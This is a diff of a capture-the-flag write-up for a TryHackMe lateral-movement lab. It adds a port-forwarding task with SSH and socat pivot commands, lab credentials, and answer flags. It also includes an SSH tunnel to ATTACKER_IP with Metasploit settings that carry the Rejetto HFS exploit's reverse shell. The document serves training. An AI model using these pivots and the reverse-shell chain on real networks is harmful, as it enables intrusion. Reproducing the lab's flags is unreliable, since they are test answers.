@@ -13,6 +13,8 @@ The room teaches lateral movement techniques used by attackers after gaining an 
 ```
 sed -i '1s|^|nameserver $THMDCIP\n|' /etc/resolv-dnsmasq
 ```
+- Kali VM wont have resolv-dnsmasq, merely adding 'nameserver $THMDCIP' to the '/etc/resolv.conf' will allow dns connection.
+
 - Test DNS with:
 ```
 nslookup thmdc.za.tryhackme.com
@@ -1190,8 +1192,9 @@ Once injected, your session silently uses t1_toby.beck’s credentials.
 
 With t1_toby.beck’s credentials loaded, connect to THMIIS:
 
-Code
+```
 winrs.exe -r:THMIIS.za.tryhackme.com cmd
+```
 No username or password required — WinRS automatically uses the credentials injected into your current session.
 
 This gives you a remote command prompt on THMIIS as t1_toby.beck.
@@ -1207,7 +1210,7 @@ The output is the answer to the challenge.
 
 
 
-## Abusing User Behaviour”
+## Task 6: Abusing User Behaviour”
 
 ### 1. Abusing Writable Shares
 
@@ -1291,7 +1294,187 @@ According to the command output above, if we were currently connected via RDP us
   Just loading Win+r and cmd, shows command prompt with c:\users\t1_toby.beck> to see     its taken over toby.beck RDP session.
 - Retrieve the flag from inside the hijacked session.
   # Paint loads and has same images as on desktop a command can simply load image and     make that image the wallpaper THM{NICE_WALLPAPER}
-  
+
+
+
+## Task 7 Port forwarding
+
+### Why Port Forwarding Matters
+
+Real networks often block SMB, RDP, WinRM, or RPC. To bypass segmentation, attackers pivot through compromised hosts using SSH tunneling, socat, or SOCKS proxies.
+
+### SSH Tunneling Overview
+
+SSH tunneling lets you forward ports through an SSH connection.
+You compromise PC‑1, then use it as a pivot to reach blocked services.
+
+### SSH Remote Port Forwarding
+
+Used when PC‑1 can reach a server port, but the attacker cannot.
+```
+ Attacker Machine
+      |
+      |  Connects to forwarded port
+      v
++-------------------+
+|  PC-1 (Pivot)     |
+|  ssh -R 3389:...  |
++-------------------+
+      |
+      |  PC-1 proxies traffic
+      v
++-------------------+
+|   Server (3389)   |
++-------------------+
+```
+
+PC‑1 runs:
+
+```
+ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
+```
+Attacker then RDPs to:
+
+```
+xfreerdp /v:127.0.0.1
+```
+
+### SSH Local Port Forwarding
+
+Used to expose attacker‑machine services to PC‑1.
+
+```
++-------------------+
+| Attacker Machine  |
+|  Port 80          |
++-------------------+
+          ^
+          |  ssh -L *:80:127.0.0.1:80
+          |
++-------------------+
+| PC-1 (Pivot)      |
+|  Listens on :80   |
++-------------------+
+```
+PC‑1 runs:
+
+```
+ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
+```
+
+### Port Forwarding with socat
+
+Used when SSH is unavailable.
+
+```
+Attacker ---> PC-1:3389 ---> Server:3389
+```
+PC‑1 runs:
+
+```
+socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
+```
+```
+Server ---> PC-1:80 ---> Attacker:80
+```
+PC‑1 runs:
+
+```
+socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
+```
+
+### Dynamic Port Forwarding (SOCKS)
+
+Creates a SOCKS proxy on the attacker machine:
+
+```
+ssh tunneluser@1.1.1.1 -R 9050 -N
+```
+Then use:
+
+```
+proxychains curl http://pxeboot.za.tryhackme.com
+```
+
+### Q1: Pivot to THMIIS using socat
+
+THMJMP2 forwards THMIIS:3389 → THMJMP2:13389:
+
+```
+socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
+```
+
+Then attacker connects:
+
+```
+xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
+```
+Flag: THM{SIGHT_BEYOND_SIGHT}
+
+### Tunnelling the Rejetto HFS Exploit
+The HFS exploit requires three connections:
+
+1. Trigger exploit → HFS port (RPORT)
+2. Victim fetches payload → attacker web server (SRVPORT)
+3. Reverse shell → attacker listener (LPORT)
+
+```
+      [THMDC:80]
+           |
+           | 1. Trigger exploit
+           v
++-----------------------+
+|   HFS Vulnerable App  |
++-----------------------+
+           |
+           | 2. Fetch payload
+           v
++-----------------------+
+| Attacker Web Server   |
+|   (SRVPORT)           |
++-----------------------+
+           |
+           | 3. Reverse shell
+           v
++-----------------------+
+| Attacker Listener     |
+|   (LPORT)             |
++-----------------------+
+```
+
+### Full SSH Pivot Setup for HFS Exploit
+```
+THMDC:80  <--R--  THMJMP2  <--L--  Attacker
+   |             |             |
+   |             |             |
+   |----> 8888 --|             |
+                 |-- 6666 -->  |
+                 |-- 7878 -->  |
+```
+SSH command on THMJMP2:
+```
+ssh tunneluser@ATTACKER_IP \
+  -R 8888:thmdc.za.tryhackme.com:80 \
+  -L *:6666:127.0.0.1:6666 \
+  -L *:7878:127.0.0.1:7878 \
+  -N
+```
+Metasploit settings:
+```
+set lhost thmjmp2.za.tryhackme.com
+set ReverseListenerBindAddress 127.0.0.1
+set lport 7878
+set srvhost 127.0.0.1
+set srvport 6666
+set rhosts 127.0.0.1
+set rport 8888
+exploit
+```
+
+Flag: THM{FORWARDING_IT_ALL}
+
+
+
 ##  Task 8
 
 First ssh into the thmjmp2 server.                                 
